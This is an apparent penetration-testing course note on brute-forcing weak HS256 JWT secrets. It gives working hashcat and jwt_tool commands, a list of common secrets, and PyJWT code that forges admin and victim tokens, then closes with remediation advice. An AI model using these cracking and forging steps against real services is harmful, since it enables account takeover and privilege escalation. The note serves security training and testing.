---
tags: [vapt, jwt, intermediate]
difficulty: intermediate
module: "18 - JWT"
topic: "18.06 Weak Secret Brute Force (hashcat, jwt_tool)"
---

# 18.06 — Weak Secret Brute Force

## Why HS256 Secrets Can Be Cracked

```
HS256 JWT = HMAC-SHA256(header.payload, SECRET)

IF SECRET IS WEAK:
  "secret", "password", "jwt", "key", "123456", "change_me"
  → Attacker tries common passwords → finds match!
  
OFFLINE BRUTE FORCE:
  Attacker only needs the JWT token (captured from any HTTP traffic)
  No rate limiting possible — it's all offline computation!
  GPU: billions of HMAC operations per second
  Weak secret (8 chars) → cracked in minutes!
  
CRITICAL IMPACT:
  Once secret is known → forge ANY JWT payload!
  Admin access, any user account, any privilege level!
```

---

## Cracking with Hashcat

```bash
# HASHCAT MODE 16500 = JWT (HS256/384/512):

# STEP 1: Get a valid JWT:
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoidXNlciJ9.SIGNATURE"

# STEP 2: Dictionary attack:
hashcat -a 0 -m 16500 "$JWT" /usr/share/seclists/Passwords/rockyou.txt

# STEP 3: Rule-based attack (transform words):
hashcat -a 0 -m 16500 "$JWT" /usr/share/seclists/Passwords/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# STEP 4: Brute force short secrets:
hashcat -a 3 -m 16500 "$JWT" '?a?a?a?a?a?a?a?a'  # 8-char brute force

# STEP 5: Common JWT secrets wordlist:
cat > jwt_secrets.txt << 'EOF'
secret
password
jwt
key
mysecret
secret123
jwtkey
change_me
mysupersecret
your-256-bit-secret
super-secret
auth_key
session_secret
flask_secret
django_key
EOF

hashcat -a 0 -m 16500 "$JWT" jwt_secrets.txt

# EXAMPLE RESULT:
# eyJhbG...SIGNATURE:secret
# → SECRET IS "secret"!
```

---

## Cracking with jwt_tool

```bash
# INSTALL:
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# BASIC DICTIONARY CRACK:
python3 jwt_tool.py TOKEN -C -d /usr/share/seclists/Passwords/rockyou.txt
# -C = crack mode
# -d = dictionary file

# JWT_SECRETS WORDLIST (bundled with jwt_tool):
python3 jwt_tool.py TOKEN -C -d jwt-secrets.txt

# ONCE CRACKED — FORGE TOKEN:
python3 jwt_tool.py TOKEN -T -S hs256 -p "found_secret"
# -T = tamper mode (prompts to change claims)
# -S = sign with algorithm
# -p = use this secret

# AUTOMATED SCAN (crack + other attacks):
python3 jwt_tool.py TOKEN -t https://target.com/api/profile \
  -rh "Authorization: Bearer JWT" \
  -C -d rockyou.txt
```

---

## After Cracking — Forging Tokens

```python
import jwt  # PyJWT library

# ONCE SECRET IS KNOWN (e.g., "secret"):
SECRET = "secret"

# FORGE ADMIN TOKEN:
payload = {
    "userId": 1,
    "role": "admin",
    "email": "admin@example.com",
    "exp": 9999999999  # far future expiry!
}

forged = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"Forged admin JWT: {forged}")

# USE IT:
# curl https://target.com/admin -H "Authorization: Bearer {forged}"

# FORGE FOR SPECIFIC USER:
target_payload = {
    "userId": 99,  # victim's user ID (found via enumeration)
    "role": "user",
    "email": "victim@example.com",
    "exp": 9999999999
}

victim_token = jwt.encode(target_payload, SECRET, algorithm="HS256")
print(f"Victim's forged JWT: {victim_token}")
```

---

## Common JWT Secrets to Try

```
COMMON SECRETS (try before full wordlist):
  ""              (empty string!)
  "secret"
  "password"
  "jwt"
  "key"
  "123456"
  "yourjwtsecret"
  "change_me"
  "todo_change_before_prod"
  "supersecret"
  "app_secret"
  "flask_secret_key"
  "django-insecure-"   (Django dev default prefix!)
  "dev_secret"
  "test_secret"
  "<app_name>"         (app name itself as secret)
  "<domain>"           (domain name as secret)
  "HS256"              (algorithm as secret — real finding!)
  
  GITHUB LEAKS:
  Search GitHub: "jwt_secret" OR "JWT_SECRET" repo:company
  Many companies accidentally commit JWT secrets!
```

---

## Fix

```
STRONG JWT SECRET REQUIREMENTS:
  ✓ Minimum 256 bits (32 bytes) of cryptographic randomness
  
  # Generate secure secret:
  python3 -c "import secrets; print(secrets.token_hex(32))"
  # → 64-character hex string (256-bit)
  
  openssl rand -hex 32
  # → Same result
  
  ✓ Never commit to version control!
    Use environment variables:
    JWT_SECRET = os.environ['JWT_SECRET']
    
  ✓ Rotate periodically (+ invalidate existing tokens)
  
  ✓ Consider RS256 instead of HS256:
    No shared secret → even if someone dumps app code → can't forge!
    Only the private key (stored securely) can sign
    
  ✓ Use a secrets manager (AWS Secrets Manager, HashiCorp Vault)
    Not .env files in Docker containers or source code
```

---

## Related Notes
- [[04 - Algorithm None Attack]] — bypass without knowing the secret
- [[05 - RS256 to HS256 Algorithm Confusion]] — using public key as HMAC
- [[14 - JWT Cracking with jwt_tool]] — comprehensive jwt_tool guide
- [[15 - JWT Cracking with hashcat]] — comprehensive hashcat guide
- [[18 - Defense Strong Algorithms Validation Short Expiry]] — fix
